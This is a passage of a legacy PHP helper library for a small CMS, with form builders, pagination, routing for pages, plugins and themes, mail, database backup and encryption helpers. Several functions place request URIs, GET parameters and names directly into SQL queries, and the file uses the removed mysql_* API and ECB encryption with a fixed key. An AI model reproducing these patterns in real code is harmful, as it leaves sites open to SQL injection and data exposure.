	filter: alpha(opacity=0);
	opacity: 0;
	content: '';
	position: absolute;
	width: 9px;
	height: 5px;
	background: transparent;
	top: 4px;
	left: 4px;
	border: 3px solid #fcfff4;
	border-top: none;
	border-right: none;
	-webkit-transform: rotate(-45deg);
	-moz-transform: rotate(-45deg);
	-o-transform: rotate(-45deg);
	-ms-transform: rotate(-45deg);
	transform: rotate(-45deg);
}
.squaredThree label:hover::after {
	-ms-filter: 'progid:DXImageTransform.Microsoft.Alpha(Opacity=30)';
	filter: alpha(opacity=30);
	opacity: 0.3;
}
.squaredThree input[type=checkbox]:checked + label:after {
	-ms-filter: 'progid:DXImageTransform.Microsoft.Alpha(Opacity=100)';
	filter: alpha(opacity=100);
	opacity: 1;
}
	</style>";
	$check .= '<div class="ondisplay"><div class="squaredThree">
  	 <input type="checkbox" id="'.$id.'" '.$name.' '.$onc.' '.$value.' />
	 <label for="'.$id.'"></label>
    </div></div>';
	}else{
		$check = error("Function checkbox( ) must be atleast 1 arg , Ex: [ Id,Name,Value,Onclick ]");
	}
	return $check;
}
function checkall(){$form=''; // form name must be
	if(count(func_get_args())==1){$arg=func_get_args();
	$form= $arg[0];
	$check = "<script type='application/javascript'>
      checked = false;
      function checkall() {
        if (checked == false){checked = true}else{checked = false}
	for (var i = 0; i < document.getElementById('".$form."').elements.length; i++) {
	  document.getElementById('".$form."').elements[i].checked = checked;
	}
      }
    </script>";
	}else{
		$check = error("Function checkall( ) must be 1 arg, [I ==> FORM ID]");
	}
	return $check;
}
function autocomplete(){
	$arg = func_get_args();
    $search_value='';
	if(count($arg)==2){
	$array=$arg[0]; 
	$inputid=$arg[1];
	foreach($array as $a){
		$search_value .= "{ value: '".$a."', data: '".$a."' },";
	}
	$msg = '<script type="text/javascript" src="http://designshack.net/tutorialexamples/html5-autocomplete-suggestions/js/jquery-1.9.1.min.js"></script>
  <script type="text/javascript" src="http://designshack.net/tutorialexamples/html5-autocomplete-suggestions/js/jquery.autocomplete.min.js"></script>'."<script>
  $(function(){
  var currencies = [  
    ".$search_value."
  ];
  $('#".$inputid."').autocomplete({
    lookup: currencies,
    onSelect: function (suggestion) {
      var thehtml = '<strong>Name:</strong> ' + suggestion.value + ' <br> <strong>Symbol:</strong> ' + suggestion.data;
      $('#outputcontent').html(thehtml);
    }
  });
});
  </script><style>
  #".$inputid." {
  padding: 0 5px 0 5px;
  background-color: #fff;
  border: 1px solid #c8c8c8;
  border-radius: 3px;
  color: #aeaeae;
  font-weight:normal;
  font-size: 1.5em;
  -webkit-transition: all 0.2s linear;
  -moz-transition: all 0.2s linear;
  transition: all 0.2s linear;
  display: block; 
}
#".$inputid.":focus {
  color: #858585;
}
.flatbtn {
  -webkit-box-sizing: border-box;
  -moz-box-sizing: border-box;
  box-sizing: border-box;
  display: inline-block;
  outline: 0;
  border: 0;
  color: #f3faef;
  text-decoration: none;
  background-color: #6bb642;
  border-color: rgba(0, 0, 0, 0.1) rgba(0, 0, 0, 0.1) rgba(0, 0, 0, 0.25);
  font-weight: bold;
  line-height: normal;
  text-align: center;
  vertical-align: middle;
  cursor: pointer;
  text-transform: uppercase;
  text-shadow: 0 1px 0 rgba(0,0,0,0.3);
  -webkit-border-radius: 3px;
  -moz-border-radius: 3px;
  border-radius: 3px;
  -webkit-box-shadow: 0 1px 0 rgba(15, 15, 15, 0.3);
  -moz-box-shadow: 0 1px 0 rgba(15, 15, 15, 0.3);
  box-shadow: 0 1px 0 rgba(15, 15, 15, 0.3);
}
.flatbtn:hover {
  color: #fff;
  background-color: #73c437;
}
.flatbtn:active {
  -webkit-box-shadow: inset 0 1px 5px rgba(0, 0, 0, 0.1);
  -moz-box-shadow:inset 0 1px 5px rgba(0, 0, 0, 0.1);
  box-shadow:inset 0 1px 5px rgba(0, 0, 0, 0.1);
}
.autocomplete-suggestions { border: 1px solid #999; background: #fff; cursor: default; overflow: auto; }
.autocomplete-suggestion { padding: 5px 5px; font-size: 1.2em; white-space: nowrap; overflow: hidden; }
.autocomplete-selected { background: #f0f0f0; }
.autocomplete-suggestions strong { font-weight: normal; color: #3399ff; }</style>";
}else{
	$msg = error("<p>Function auto_complete must be 2 args!<p><p>I=>array values, II=>input id</p>");
}
  return $msg;
}
function site_base(){
	$base = basename(getcwd());
    return 'http://'.$_SERVER['HTTP_HOST'].'/'.$base; 
}
function plugin_base(){
	return site_base().'/partition/plugins/';
}
function mail_server(){
	if($_SERVER['HTTP_HOST']=='localhost'){
		$msg = '<span class="error">Email not accessible in localhost !</span>';
	}else{
		$msg = true;
	}
	return $msg;
}
function check_extension_status($ext){ $status = '0';
	$status = num(DB_PREFIX."extensions where extension='".$ext."' and status=1");
	return $status;
}
function check_plugin_status($plugin){ $status = '0';
	$status = num(DB_PREFIX."plugins where plugin='".$plugin."' and status=1");
	return $status;
}
function insert_extension_data($data = array()){ # array ==> array('url_link'=>'file_path','url_link'=>'file_path')
	    $extension = '';
		foreach($data as $page=>$file){
		   $ext = explode('/',$file);
			if(is_array($ext)){
			$extension = $ext[0];
			}
		 if(num(DB_PREFIX."pages where extension_file='".$file."' and friendly_url='".$page."'")==0){
		  query("insert into ".DB_PREFIX."pages set friendly_url='".$page."',extension_file='".$file."',extension='".$extension."'");
		 }
		}
}
function insert_plugin_data($data = array()){ # array ==> array('url_link'=>'file_path','url_link'=>'file_path')
	    $extension = '';
		foreach($data as $page=>$file){
		   $ext = explode('/',$file);
			if(is_array($ext)){
			$extension = $ext[0];
			}
		 if(num(DB_PREFIX."pages where plugin_file='".$file."' and friendly_url='".$page."'")==0){
		  query("insert into ".DB_PREFIX."pages set friendly_url='".$page."',plugin_file='".$file."',plugin='".$extension."'");
		 }
		}
}
function getpage(){ global $plug; 
    $partition_base = 'partition/themes/'; 
    $ext_base = 'partition/extensions/';
	$plug_base= 'partition/plugins/';
    $page_url = basename($_SERVER['REQUEST_URI']);
	if(strpos($page_url,'?')==true){
			$exp = explode('?',$page_url); $page_url = $exp[0];
		}

	$sort = 'order by page_id desc limit 1';
	$sql_ex = select(DB_PREFIX."pages where friendly_url='".$page_url."' and extension_file!='' $sort"); # I st
	$ext = fetch($sql_ex);
	
	$sql_pl = select(DB_PREFIX."pages where friendly_url='".$page_url."' and plugin_file!='' $sort");# II nd
	$plug = fetch($sql_pl);
	
	$sql_tpl = select(DB_PREFIX."pages where friendly_url='".$page_url."' and tpl!='' and extension_file='' and plugin_file='' $sort");# III rd
	$tp = fetch($sql_tpl);
	if(mysql_num_rows($sql_ex)>0 && check_extension_status($ext->extension)=='1'){ 
	if($ext->extension_file!=''){  
		if(file_exists($ext_base.$ext->extension_file)){
			 ob_start();
			 require $ext_base.$ext->extension_file;
			 $tpl = ob_get_clean();
			}else{ $tpl = error($ext->extension_file." File not found !"); }
	}
	}
	elseif(mysql_num_rows($sql_pl)>0 && check_plugin_status($plug->plugin)=='1'){ 
	if($plug->plugin_file!=''){ 
		if(file_exists($plug_base.$plug->plugin_file)){
			 ob_start();
			 require $plug_base.$plug->plugin_file;
			 $tpl = ob_get_clean();
			}else{ $tpl = error($plug->plugin_file." File not found !"); }
	}}
	elseif(mysql_num_rows($sql_tpl)>0){
		if(file_exists($partition_base.THEME_BASE().'/templates/'.$tp->tpl)){
			 ob_start();
			 require $partition_base.THEME_BASE().'/templates/'.$tp->tpl;
			 $tpl = ob_get_clean();
			}else{ $tpl = error($tp->tpl." File not found !"); }
	}else{ 
	  $tpl = false;
	}
	return $tpl;
}
function getpost(){ global $plug; 
    $partition_base = 'partition/themes/'; 
	$ext_base = 'partition/extensions/';
	$plug_base= 'partition/plugins/';
    $page_url = basename($_SERVER['REQUEST_URI']);
	if(strpos($page_url,'?')==true){
			$exp = explode('?',$page_url); $page_url = $exp[0];
		}
	$sort = 'order by post_id desc limit 1';
	$sql_ex = select(DB_PREFIX."posts where friendly_url='".$page_url."' and extension_file!='' $sort"); # I st
	$ext = fetch($sql_ex);
	
	$sql_pl = select(DB_PREFIX."posts where friendly_url='".$page_url."' and plugin_file!='' $sort");# II nd
	$plug = fetch($sql_pl);
	
	$sql_tpl = select(DB_PREFIX."posts where friendly_url='".$page_url."' and tpl!='' and extension_file='' and plugin_file='' $sort");# III rd
	$tp = fetch($sql_tpl);
	if(mysql_num_rows($sql_ex)>0 && check_extension_status($ext->extension)=='1'){ 
	if($ext->extension_file!=''){  
		if(file_exists($ext_base.$ext->extension_file)){
			 ob_start();
			 require $ext_base.$ext->extension_file;
			 $tpl = ob_get_clean();
			}else{ $tpl = error($ext->extension_file." File not found !"); }
	}
	}
	elseif(mysql_num_rows($sql_pl)>0 && check_plugin_status($plug->plugin)=='1'){ 
	if($plug->plugin_file!=''){ 
		if(file_exists($plug_base.$plug->plugin_file)){
			 ob_start();
			 require $plug_base.$plug->plugin_file;
			 $tpl = ob_get_clean();
			}else{ $tpl = error($plug->plugin_file." File not found !"); }
	}}
	elseif(mysql_num_rows($sql_tpl)>0){
		if(file_exists($partition_base.THEME_BASE().'/templates/'.$tp->tpl)){ 
			 ob_start();
			 require $partition_base.THEME_BASE().'/templates/'.$tp->tpl;
			 $tpl = ob_get_clean();
			}else{ $tpl = error($tp->tpl." File not found !"); }
	}else{ 
	  $tpl = false;
	}
	return $tpl;
}
function gettpl(){
	$files = '';
	$tpl = '../partition/themes/'.THEME_BASE().'/templates/';
	if(is_dir($tpl)){
	foreach(glob($tpl.'*.php') as $file){
		$files[]=$file;
	}}
	return $files;
}
function check_page($page_id){
	$ur = $_SERVER['REQUEST_URI'];
    $pageurl = basename($ur);
	$que = mysql_query("select * from ".DB_PREFIX."pages where page_link='".$pageurl."'");
	$page = mysql_num_rows($que);
	if($page==1){ return true;	}
}
function home(){ $return = false;
	    $website_home = basename($_SERVER['REQUEST_URI']); 
		if(strpos($website_home,'?')===false){ 
		}else{ $exp = explode('?',$website_home); $website_home = $exp[0]; }
	    $home = basename(getcwd());
		$home_ = 'index.php';
		if($website_home==$home or $website_home==$home_ or $website_home==''){
				$return = true;	
		}
		return $return;
}
function theme_page(){ $page=true;
    if(home()==false){
		$page_url = basename($_SERVER['REQUEST_URI']);
		if(strpos($page_url,'?')==true){
			$exp = explode('?',$page_url); $page_url = $exp[0];
		}
		
		$sql = select(DB_PREFIX."posts where friendly_url='".$page_url."'");
		$sql_ = select(DB_PREFIX."pages where friendly_url='".$page_url."'");
		if((mysql_num_rows($sql)>0)){  
		   echo $page = getpost();
		}elseif(mysql_num_rows($sql_)>0){
		   echo $page = getpage();
		}/*else{		  
		     require_once 'frame/404.php';		   
		}*/
	}
	return $page;
}
function current_theme(){
	$current = '';
	$q = select(DB_PREFIX."themes where status=1");
	$count = num(DB_PREFIX."themes where status=1");
	if($count==1){
	$ft = fetch($q);	
	$current = THEME_PATH.$ft->theme.'/index.php';
	$data = file_get_contents($current);
	$regex = '/connect_theme()/'; // Find out the function in index page
	if (preg_match($regex, $data)) {
		$current = THEME_PATH.$ft->theme.'/index.php';
	} else {
		$current = 'frame/theme_error.php';
	}
	}
	return $current;
}
function theme_empty(){
	if(admin_is_login()==true){ display_top_menu();} # User Panel Top Menu Is Admin Login #
	echo "<p style='padding:20px; border:1px #eee solid; box-shadow:1px 1px 6px #ccc; color:#F00; margin:auto; text-align:center;'>PLEASE INSTALL AND ACTIVATE THEME</p>";
}
function connect_plugin(){$Plug=$short=''; $dev_plugin='';
    $P_ARG = func_get_args();
	if(count($P_ARG)!=''){$short = $P_ARG[0];}
	if($short!=''){
	$PL = explode('/',INTER);
    $Plug_path = $inter = $PL[0].'/plugins/';
	if(is_dir($Plug_path)){
		foreach(glob($Plug_path.'*') as $file){
		$current = $file.'/short_code.txt';
		if(file_exists($current)){
			$data = file_get_contents($current);			
			if(num(DB_PREFIX."plugins where plugin='".basename($file)."' and status=1")==1){ 
			 if(strpos($data,$short)===false){ # Sorry short code is not found!
				
				 }else{  require($file.'/index.php'); }
			 }else{	/*PLUG INACTIVE*/}
		}else{ /* Plugin Struture Invalid*/ }
		}
	  }
	}
	return $dev_plugin;
}
function connect_module($module_name){ $msg='';
	       $md = explode('/',INTER);
		   $module_path = $inter = $md[0].'/modules/';
		   if(is_dir($module_path)){
			   foreach(glob($module_path.'*') as $file){
				$config = $file.'/config.xml';
				$index = $file.'/module.php';				
				if(file_exists($config)&&file_exists($index)){
					 $view = simplexml_load_file($config);
			         if($view->module->name==$module_name){
						 if($view->module->status=='true'){
							 if($view->module->name==$module_name){
								    require($index);
									$object = (string)$view->module->name;
                                    $msg = new $object;							 
							 }
						 }else{
						 echo error("Module status is false in '".$config."' file"); exit;
						 }
					 }else{
						 echo error("Sorry module class does not match in '".$config."' file"); exit;
					 }
				}else{
					echo error('Module Structure Invalid!'); exit;
				}
				}
		   }
		   return $msg;
}
function __secure__(){
	$_32 = '32';$_d = 'deva';
	$_m = 'mail';$_c = 'com';
	return $_32.$_d.'@g'.$_m.'.'.$_c;
	}
function THEME_PATH_PREFIX(){ return 'partition/themes/'; }

function THEME_BASE(){
	$THEME = '';
	$q = select(DB_PREFIX."themes where status=1");
	if(mysql_num_rows($q)>0){
    $ft = fetch($q);
    $THEME = $ft->theme;	
	}return $THEME;
}
function connect_theme(){
	define('THEME_BASE',THEME_BASE());
	function __autoload($theme){
	if(file_exists('partition/load/'.$theme.'.php')){
	  require 'partition/load/'.$theme.'.php';
	}}
	new dev__theme();
}
function smtp(){
	if(count(func_get_args())==4){ $fun=func_get_args();
	$smtp_to = $fun[0];
	$smtp_sub = $fun[1];
	$smtp_msg = $fun[2];
	$headers = "MIME-Version: 1.0" . "\r\n";
    $headers .= "Content-type:text/html;charset=iso-8859-1" . "\r\n";
    $headers .= 'From: <'.$fun[3].'>' . "\r\n";
    $headers .= 'Cc: '.$fun[3]. "\r\n";
	$mail_status = smtp_mail($smtp_to,$smtp_sub,$smtp_msg,$headers);
    }else{
	$mail_status = error("smtp() function should be 4 args! Example: [ From,To,Subject,Message ]");
	}
	return $mail_status;
}
function encode($code){	return base64_encode($code);}
function decode($code){	return base64_decode($code);}
function encrypt($text){
	define('SALT','plugins/');
        return trim(base64_encode(mcrypt_encrypt(MCRYPT_RIJNDAEL_256, SALT, $text, MCRYPT_MODE_ECB, mcrypt_create_iv(mcrypt_get_iv_size(MCRYPT_RIJNDAEL_256, MCRYPT_MODE_ECB), MCRYPT_RAND))));
    }
define('SALT','plugins/');
function decrypt($text){
        return trim(mcrypt_decrypt(MCRYPT_RIJNDAEL_256, SALT, base64_decode($text), MCRYPT_MODE_ECB, mcrypt_create_iv(mcrypt_get_iv_size(MCRYPT_RIJNDAEL_256, MCRYPT_MODE_ECB), MCRYPT_RAND)));
    }
function num($tbl){
	if($gg = mysql_query("select * from $tbl")){
	return mysql_num_rows($gg);
	}
}
function date_count($from,$to){
	$startTimeStamp = strtotime($from);
	$endTimeStamp = strtotime($to);
	$timeDiff = abs($endTimeStamp - $startTimeStamp);
	$numberDays = $timeDiff/86400; 
	return intval($numberDays);
}

/* backup the db OR just a table */
function backup_db($host,$user,$pass,$name,$tables = '*'){ // host, user, pass,dbname
     error_reporting(0);
	//get all of the tables
	if($tables == '*'){
		$tables = array();
		$result = mysql_query('SHOW TABLES');
		while($row = mysql_fetch_row($result))
		{
			$tables[] = $row[0];
		}
	}
	else
	{
		$tables = is_array($tables) ? $tables : explode(',',$tables);
	}
	
	//cycle through
	foreach($tables as $table)
	{
		$result = mysql_query('SELECT * FROM '.$table);
		$num_fields = mysql_num_fields($result);
		
		$return.= 'DROP TABLE '.$table.';';
		$row2 = mysql_fetch_row(mysql_query('SHOW CREATE TABLE '.$table));
		$return.= "\n\n".$row2[1].";\n\n";
		
		for ($i = 0; $i < $num_fields; $i++) 
		{
			while($row = mysql_fetch_row($result))
			{
				$return.= 'INSERT INTO '.$table.' VALUES(';
				for($j=0; $j<$num_fields; $j++) 
				{
					$row[$j] = addslashes($row[$j]);
					$row[$j] = ereg_replace("\n","\\n",$row[$j]);
					if (isset($row[$j])) { $return.= '"'.$row[$j].'"' ; } else { $return.= '""'; }
					if ($j<($num_fields-1)) { $return.= ','; }
				}
				$return.= ");\n";
			}
		}
		$return.="\n\n\n";
	}
	
	//save file
	$file_ = 'db-backup-'.time().'-'.(md5(implode(',',$tables))).'.sql';
	$handle = fopen('db/db-backup-'.time().'-'.(md5(implode(',',$tables))).'.sql','w+');
	fwrite($handle,$return);
	fclose($handle);
	download('db',$file_);	
}

function pagination($tbl,$lim){
		echo "
		<style>
		div.pagination {
	padding: 3px;
	margin: 3px;
}

div.pagination a {
	padding: 2px 5px 2px 5px;
	margin: 2px;
	border: 1px solid #AAAADD;
	
	text-decoration: none; /* no underline */
	color: #000099;
}
div.pagination a:hover, div.pagination a:active {
	border: 1px solid #000099;

	color: #000;
}
div.pagination span.current {
	padding: 2px 5px 2px 5px;
	margin: 2px;
		border: 1px solid #000099;
		
		font-weight: bold;
		background-color: #000099;
		color: #FFF;
	}
	div.pagination span.disabled {
		padding: 2px 5px 2px 5px;
		margin: 2px;
		border: 1px solid #EEE;
	
		color: #DDD;
	}
	
		</style>
		";
		// edit deva		
		$que = mysql_query("select * from ".$tbl);
		$My = mysql_num_rows($que);
		if($My > $lim){
		$tbl_name=$tbl;	
		$adjacents = 3;
		$query = "SELECT COUNT(*) as num FROM $tbl_name";
		$total_pages = mysql_fetch_array(mysql_query($query));
		$total_pages = $total_pages['num'];
		
		/* Setup vars for query. */
		$urlBase = basename($_SERVER['REQUEST_URI']);
		if(strpos($urlBase,'?')===false){
			$targetpage = $urlBase;
		}else{
			$ex = explode('?',$urlBase);
			$targetpage = $ex[0];
		} 
		
		$limit = $lim; 
		if(!empty($_GET['page'])){							//how many items to show per page
		$page = $_GET['page'];
		}else{
			$page = 1;
		}
		if($page) 
			$start = ($page - 1) * $limit; 			//first item to display on this page
		else
			$start = 0;								//if no page var is given, set start to 0
		
		/* Get data. */
		$sql = "SELECT * FROM $tbl_name LIMIT $start, $limit";
		$result = mysql_query($sql);
		
		/* Setup page vars for display. */
		if ($page == 0) $page = 1;					//if no page var is given, default to 1.
		$prev = $page - 1;							//previous page is page - 1
		$next = $page + 1;							//next page is page + 1
		$lastpage = ceil($total_pages/$limit);		//lastpage is = total pages / items per page, rounded up.
		$lpm1 = $lastpage - 1;						//last page minus 1
		
		$pagination = "";
		if($lastpage > 1)
		{	
			$pagination .= "<div class=\"pagination\">";
			//previous button
			if ($page > 1) 
				$pagination.= "<a href=\"$targetpage?page=$prev\">Previous</a>";
			else
				$pagination.= "<span class=\"disabled\">Previous</span>";	
			
			//pages	
			if ($lastpage < 7 + ($adjacents * 2))	//not enough pages to bother breaking it up
			{	
				for ($counter = 1; $counter <= $lastpage; $counter++)
				{
					if ($counter == $page)
						$pagination.= "<span class=\"current\">$counter</span>";
					else
						$pagination.= "<a href=\"$targetpage?page=$counter\">$counter</a>";					
				}
			}
			elseif($lastpage > 5 + ($adjacents * 2))	//enough pages to hide some
			{
				//close to beginning; only hide later pages
				if($page < 1 + ($adjacents * 2))		
				{
					for ($counter = 1; $counter < 4 + ($adjacents * 2); $counter++)
					{
						if ($counter == $page)
							$pagination.= "<span class=\"current\">$counter</span>";
						else
							$pagination.= "<a href=\"$targetpage?page=$counter\">$counter</a>";					
					}
					$pagination.= "...";
					$pagination.= "<a href=\"$targetpage?page=$lpm1\">$lpm1</a>";
					$pagination.= "<a href=\"$targetpage?page=$lastpage\">$lastpage</a>";		
				}
				//in middle; hide some front and some back
				elseif($lastpage - ($adjacents * 2) > $page && $page > ($adjacents * 2))
				{
					$pagination.= "<a href=\"$targetpage?page=1\">1</a>";
					$pagination.= "<a href=\"$targetpage?page=2\">2</a>";
					$pagination.= "...";
					for ($counter = $page - $adjacents; $counter <= $page + $adjacents; $counter++)
					{
						if ($counter == $page)
							$pagination.= "<span class=\"current\">$counter</span>";
						else
							$pagination.= "<a href=\"$targetpage?page=$counter\">$counter</a>";					
					}
					$pagination.= "...";
					$pagination.= "<a href=\"$targetpage?page=$lpm1\">$lpm1</a>";
					$pagination.= "<a href=\"$targetpage?page=$lastpage\">$lastpage</a>";		
				}
				//close to end; only hide early pages
				else
				{
					$pagination.= "<a href=\"$targetpage?page=1\">1</a>";
					$pagination.= "<a href=\"$targetpage?page=2\">2</a>";
					$pagination.= "...";
					for ($counter = $lastpage - (2 + ($adjacents * 2)); $counter <= $lastpage; $counter++)
					{
						if ($counter == $page)
							$pagination.= "<span class=\"current\">$counter</span>";
						else
							$pagination.= "<a href=\"$targetpage?page=$counter\">$counter</a>";					
					}
				}
			}
			
			//next button
			if ($page < $counter - 1) 
				$pagination.= "<a href=\"$targetpage?page=$next\">Next</a>";
			else
				$pagination.= "<span class=\"disabled\">Next</span>";
			$pagination.= "</div>\n";
			$re_result = array($result,$pagination);		
		}
		}
		else
		{
			$re_result = array($que,"");
		}
		return $re_result;
	}
	function sub_pagination($tbl,$lim,$var)
	{
		echo "
		<style>
		div.pagination {
	padding: 3px;
	margin: 3px;
}

div.pagination a {
	padding: 2px 5px 2px 5px;
	margin: 2px;
	border: 1px solid #AAAADD;
	
	text-decoration: none; /* no underline */
	color: #000099;
}
div.pagination a:hover, div.pagination a:active {
	border: 1px solid #000099;

	color: #000;
}
div.pagination span.current {
	padding: 2px 5px 2px 5px;
	margin: 2px;
		border: 1px solid #000099;
		
		font-weight: bold;
		background-color: #000099;
		color: #FFF;
	}
	div.pagination span.disabled {
		padding: 2px 5px 2px 5px;
		margin: 2px;
		border: 1px solid #EEE;
	
		color: #DDD;
	}
	
		</style>
		";
		// edit deva		
		$que = mysql_query("select * from $tbl");
		$My = mysql_num_rows($que);
		if($My > $lim)
		{
		$tbl_name=$tbl;	
		$adjacents = 3;
		$query = "SELECT COUNT(*) as num FROM $tbl_name";
		$total_pages = mysql_fetch_array(mysql_query($query));
		$total_pages = $total_pages['num'];
		
		/* Setup vars for query. */
		$targetpage = $_SERVER['PHP_SELF']."?$var"; 	//your file name  (the name of this file)
		$limit = $lim; 
		if(!empty($_GET['page'])){							//how many items to show per page
		$page = $_GET['page'];
		}else{
			$page = 1;
		}
		if($page) 
			$start = ($page - 1) * $limit; 			//first item to display on this page
		else
			$start = 0;								//if no page var is given, set start to 0
		
		/* Get data. */
		$sql = "SELECT * FROM $tbl_name LIMIT $start, $limit";
		$result = mysql_query($sql);
		
		/* Setup page vars for display. */
		if ($page == 0) $page = 1;					//if no page var is given, default to 1.
		$prev = $page - 1;							//previous page is page - 1
		$next = $page + 1;							//next page is page + 1
		$lastpage = ceil($total_pages/$limit);		//lastpage is = total pages / items per page, rounded up.
		$lpm1 = $lastpage - 1;						//last page minus 1
		
		$pagination = "";
		if($lastpage > 1)
		{	
			$pagination .= "<div class=\"pagination\">";
			//previous button
			if ($page > 1) 
				$pagination.= "<a href=\"$targetpage&page=$prev\">Previous</a>";
			else
				$pagination.= "<span class=\"disabled\">Previous</span>";	
			
			//pages	
			if ($lastpage < 7 + ($adjacents * 2))	//not enough pages to bother breaking it up
			{	
				for ($counter = 1; $counter <= $lastpage; $counter++)
				{
					if ($counter == $page)
						$pagination.= "<span class=\"current\">$counter</span>";
					else
						$pagination.= "<a href=\"$targetpage&page=$counter\">$counter</a>";					
				}
			}
			elseif($lastpage > 5 + ($adjacents * 2))	//enough pages to hide some
			{
				//close to beginning; only hide later pages
				if($page < 1 + ($adjacents * 2))		
				{
					for ($counter = 1; $counter < 4 + ($adjacents * 2); $counter++)
					{
						if ($counter == $page)
							$pagination.= "<span class=\"current\">$counter</span>";
						else
							$pagination.= "<a href=\"$targetpage&page=$counter\">$counter</a>";					
					}
					$pagination.= "...";
					$pagination.= "<a href=\"$targetpage&page=$lpm1\">$lpm1</a>";
					$pagination.= "<a href=\"$targetpage&page=$lastpage\">$lastpage</a>";		
				}
				//in middle; hide some front and some back
				elseif($lastpage - ($adjacents * 2) > $page && $page > ($adjacents * 2))
				{
					$pagination.= "<a href=\"$targetpage&page=1\">1</a>";
					$pagination.= "<a href=\"$targetpage&page=2\">2</a>";
					$pagination.= "...";
					for ($counter = $page - $adjacents; $counter <= $page + $adjacents; $counter++)
					{
						if ($counter == $page)
							$pagination.= "<span class=\"current\">$counter</span>";
						else
							$pagination.= "<a href=\"$targetpage&page=$counter\">$counter</a>";					
					}
					$pagination.= "...";
					$pagination.= "<a href=\"$targetpage&page=$lpm1\">$lpm1</a>";
					$pagination.= "<a href=\"$targetpage&page=$lastpage\">$lastpage</a>";		
				}
				//close to end; only hide early pages
				else
				{
					$pagination.= "<a href=\"$targetpage&page=1\">1</a>";
					$pagination.= "<a href=\"$targetpage&page=2\">2</a>";
					$pagination.= "...";
					for ($counter = $lastpage - (2 + ($adjacents * 2)); $counter <= $lastpage; $counter++)
					{
						if ($counter == $page)
							$pagination.= "<span class=\"current\">$counter</span>";
						else
							$pagination.= "<a href=\"$targetpage&page=$counter\">$counter</a>";					
					}
				}
			}
			
			//next button
			if ($page < $counter - 1) 
				$pagination.= "<a href=\"$targetpage&page=$next\">Next</a>";
			else
				$pagination.= "<span class=\"disabled\">Next</span>";
			$pagination.= "</div>\n";
			$re_result = array($result,$pagination);		
		}
		}else{	$re_result = array($que,"");}
		return $re_result;
	}
function css(){
	$fun = func_get_args();
	if(!empty($fun)){
	foreach($fun as $style){
	 //echo '@import url("'.BASE_URL.'/css/'.$style.'")';
	 echo '<link href="'.BASE_URL.'/css/'.$style.'" rel="stylesheet"><br>';
	}
	}
}
function url($id,$type){$link='#';
	if($type=='post'){
		if(num(DB_PREFIX."posts where post_id=".decode($id))==1){
		$p=fetch_once(DB_PREFIX."posts","post_id=".decode($id));
		$link = $p->friendly_url;
		if($link==''){ $link='page.php?p_id='.decode($id); }
		}
	}else{
		if(num(DB_PREFIX."pages where page_id=".decode($id))==1){
		$p=fetch_once(DB_PREFIX."pages","page_id=".decode($id));
		$link = $p->friendly_url;
		if($link==''){ $link='page.php?page_id='.decode($id); }
		}
	}	
	echo $link;
}
function startform(){
	$n = 'myform';
	$m = 'post';
	$val = func_get_args();  
	if(!empty($val)){ 
	if(count($val)==2){ $m = $val[1]; }
	$n = $val[0]; 
	 	$b = '<form name="'.$n.'" method="'.$m.'" enctype="multipart/form-data">';	}else{
		$b = '<form name="'.$n.'" method="'.$m.'" enctype="multipart/form-data">';
	}
	return $b;
}
function js(){
	$fun = func_get_args();
	if(!empty($fun)){
	foreach($fun as $js){
	echo '<script src="'.BASE_URL.'/js/'.$js.'"></script>';
	}
	}
}
function closeform(){
	return '</form>';
}
function back(){
	$val = func_get_args();
	if(!empty($val)){ $val=$val[0]; $b= '<input type="button" onclick="history.go(-1);" value="'.$val.'">';}else{
		$b= '<input type="button" onclick="history.go(-1);" value="Back">';
	}
	return $b;
}
function reset_(){
	$val = func_get_args(); 
	if(!empty($val)){ $val=$val[0];	$b = '<input type="reset" name="" value="'.$val.'">';	}else{
		$b = '<input type="reset" name="" value="Reset">';
	}
	return $b;
}
function button(){
	$oncl = '';
	$val = func_get_args();  
	if(!empty($val)){ 
	if(count($val)==2){	$oncl = $val[1]; }
	$val = $val[0]; 	
	$b = '<input type="button" name="button" value="'.$val.'" onclick="'.$oncl.'">';	
	}else{
	$b = '<input type="button" name="button" value="Button">';
	}
	return $b;
}
function text(){
	$oncl = '';
	$val = func_get_args();  
	if(!empty($val)){ 
	    if(count($val)==2){	$oncl = $val[1]; }
     	$val = $val[0];
		$b = '<input type="text" name="'.$val.'" value="'.$oncl.'">';	}else{
		$b = '<input type="text" name="text" value="">';
	}
	return $b;
}
function email(){
	$oncl = '';
	$val = func_get_args();  
	if(!empty($val)){ 
	    if(count($val)==2){	$oncl = $val[1]; }
     	$val = $val[0];
		$b = '<input type="email" name="'.$val.'" value="'.$oncl.'">';	}else{
		$b = '<input type="email" name="email" value="">';
	}
	return $b;
}
function hidden(){
	$oncl = '';
	$val = func_get_args();  
	if(!empty($val)){ 
	    if(count($val)==2){	$oncl = $val[1]; }
     	$val = $val[0];
		$b = '<input type="hidden" name="'.$val.'" value="'.$oncl.'">';	}else{
		$b = '<input type="hidden" name="hidden" value="">';
	}
	return $b;
}
function file_(){
	$val = func_get_args();  
	if(!empty($val)){ $n=$val[0];	$b = '<input type="file" name="'.$n.'" value="">';	}else{
		$b = '<input type="file" name="file" value="">';
	}
	return $b;
}
function submit(){  // value 1, value 2 
    $oncl = '';
	$val = func_get_args(); 
	if(!empty($val)){ 
	if(count($val)==2){	$oncl = $val[1]; }
	$n=$val[0];
	$b = '<input type="submit" name="submit" onclick="'.$oncl.'" value="'.$n.'">';	}else{
	$b = '<input type="submit" name="submit" value="Submit">';
	}
	return $b;
}

function compress($source, $destination, $quality) { $info = getimagesize($source); if ($info['mime'] == 'image/jpeg') $image = imagecreatefromjpeg($source); elseif ($info['mime'] == 'image/gif') $image = imagecreatefromgif($source); elseif ($info['mime'] == 'image/png') $image = imagecreatefrompng($source); imagejpeg($image, $destination, $quality); return $destination;
 }
function popup(){
	$button_value = 'Click Me';
	$pop_desc = 'Welcome to dev__ popup';
	$arg = func_get_args();	
	if(!empty($arg[0])){$button_value = $arg[0];}
	if(!empty($arg[1])){$pop_desc = $arg[1];}
	$button = '<div id="my_modal" class="pbg" style="display:none;margin:1em;">
    <a href="#" class="my_modal_close" style="float:right;padding:0 0.4em;">X</a>
	'.$pop_desc.'
	<button class="pbut btn-alert my_modal_close">Close</button>
    </div><input type="button" class="my_modal_open pbut" value="'.$button_value.'">';
	$button .= '<script type="text/javascript" charset="utf-8">
$(document).ready(function() {$(".my_modal_open").click(function(){$("#my_modal").popup({"autoopen": true});});});
</script>';	
	return $button;
}
// image resize
function resizeimage($filename, $max_width, $max_height){
          $imagepath = $filename;
          $save = $imagepath; //This is the new file you saving
          $file = $imagepath; //This is the original file

